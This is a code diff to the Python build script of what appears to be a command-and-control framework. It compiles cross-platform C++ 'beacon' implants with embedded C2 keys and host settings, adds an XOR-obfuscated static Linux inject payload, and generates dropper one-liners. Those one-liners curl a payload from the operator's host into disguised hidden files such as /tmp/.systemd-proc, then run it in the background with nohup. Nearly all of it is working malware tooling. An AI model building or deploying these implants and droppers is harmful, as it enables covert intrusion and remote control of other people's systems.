@@ -124,7 +124,7 @@ def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
         return None
 
 
-def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64", disable_anti: bool = False, host: str = "127.0.0.1", port: int = 8080) -> Optional[str]:
+def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64", disable_anti: bool = True, host: str = "127.0.0.1", port: int = 8080, use_ssl: bool = True) -> Optional[str]:
     """
     Compiles the C++ beacon for the specified platform and architecture.
     Embeds C2 keys from environment into crypto_config.h at build time.
@@ -137,7 +137,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
     
     # Cleanup any existing beacon process to prevent "Permission denied"
-    if platform == "windows":
+    if os.name == 'nt':
         subprocess.run(["taskkill", "/F", "/IM", "beacon.exe", "/T"], capture_output=True)
         subprocess.run(["taskkill", "/F", "/IM", "beacon.dll", "/T"], capture_output=True)
     
@@ -163,7 +163,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
         f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
 
     write_beacon_crypto_config(beacon_dir)
-    write_beacon_c2_config(beacon_dir, host=host, port=port)
+    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl)
 
     if platform == "windows":
         console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
@@ -448,21 +448,44 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     elif platform == "linux":
         console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
         try:
-            # Nota: -static è stato rimosso.
-            # Su Debian/Kali, libcurl è compilato con supporto Kerberos/GSSAPI,
-            # ma i pacchetti di sistema NON forniscono le versioni statiche (.a) di Kerberos.
-            # Inoltre, glibc sconsiglia il linking statico per funzioni di rete (getaddrinfo/NSS).
-            # Pertanto, usiamo il linking dinamico standard.
             cmd = [
                 "g++", "-std=c++20", "-O2", "-s",
                 "-o", out_name, "-Isrc", "src/main.cpp",
-                "-lcurl", "-lssl", "-lcrypto", "-lpthread", "-ldl"
+                "-lssl", "-lcrypto", "-lpthread", "-ldl"
             ]
             if arch == "x86":
                 cmd.insert(1, "-m32")
 
             subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
             _mark_built(beacon_dir, out_name)
+
+            # Build static + XOR'd inject payload
+            static_name = "beacon_linux_static"
+            static_path = os.path.join(beacon_dir, static_name)
+            try:
+                static_cmd = [
+                    "g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
+                    "-o", static_name, "-Isrc", "src/main.cpp",
+                    "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"
+                ]
+                subprocess.run(static_cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
+
+                xored_path = os.path.join(beacon_dir, "beacon_linux_xored.bin")
+                with open(static_path, "rb") as f:
+                    data = f.read()
+                xored = bytes(b ^ _XOR_KEY for b in data)
+                with open(xored_path, "wb") as f:
+                    f.write(xored)
+
+                for tmp in [static_name, "beacon_linux_raw.bin"]:
+                    tmp_path = os.path.join(beacon_dir, tmp)
+                    if os.path.exists(tmp_path):
+                        os.unlink(tmp_path)
+
+                console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
+            except Exception as static_err:
+                console.print(f"[yellow][!] Static inject payload not built: {static_err}[/yellow]")
+
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Linux compilation failed:\n{e.stderr}")
@@ -495,23 +518,24 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     elif platform == "android":
         console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
         ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
-        ndk_cc = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "bin", "aarch64-linux-android28-clang++")
+        ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
+        ndk_cc = os.path.join(ndk_prebuilt, "bin", "aarch64-linux-android28-clang++")
         if not os.path.exists(ndk_cc):
             notifier.error(f"NDK compiler not found at {ndk_cc}")
             return None
         try:
-            ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
             ndk_sysroot = os.path.join(ndk_prebuilt, "sysroot")
             ndk_include = os.path.join(ndk_sysroot, "usr", "include")
             ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
             subprocess.run(
-                [ndk_cc, "-std=c++20", "-O2", "-s", "-o", "beacon_android",
+                [ndk_cc, "-std=c++20", "-O2", "-s", "-static-libstdc++", "-o", out_name,
                  "-Isrc", "src/main.cpp",
                  f"--sysroot={ndk_sysroot}",
                  f"-I{ndk_include}",
                  f"-L{ndk_lib}",
-                 "-lcurl", "-lssl", "-lcrypto", "-static"],
+                 "-lssl", "-lcrypto", "-ldl"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True)
+            console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
             _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
@@ -591,15 +615,15 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
 
     elif platform == "linux":
         path = "payload_linux_x86" if arch == "x86" else "payload_linux"
-        url = f"http://{lhost}:8080/api/v1/{path}?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} &>/dev/null &"
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
+        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
 
     elif platform == "macos":
-        url = f"http://{lhost}:8080/api/v1/payload_macos?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} &>/dev/null &"
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_macos?{token_param}"
+        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
 
     elif platform == "android":
-        url = f"http://{lhost}:8080/api/v1/payload_android?{token_param}"
-        return f"curl -sk '{url}' -o /data/local/tmp/.android-runtime && chmod +x /data/local/tmp/.android-runtime && /data/local/tmp/.android-runtime {lhost} {lport} &"
+        beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
+        return f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
 
     return ""
